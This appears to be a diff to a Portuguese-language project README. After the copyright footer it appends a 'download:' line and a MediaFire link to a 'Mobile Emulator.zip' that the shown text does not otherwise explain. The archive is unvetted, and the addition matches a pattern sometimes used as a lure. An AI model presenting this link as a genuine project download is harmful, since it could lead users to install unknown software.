@@ -56,3 +56,6 @@ Em navegadores que bloqueiam a leitura de arquivos locais por `fetch()`, abra o 
 ---
 
 © IanPaulo. Projeto mantido por [@ianPaulo900Dev](https://github.com/ianPaulo900Dev).
+
+download: 
+https://www.mediafire.com/file/x1y0jiqcfgm9ef3/Mobile+Emulator.zip/file
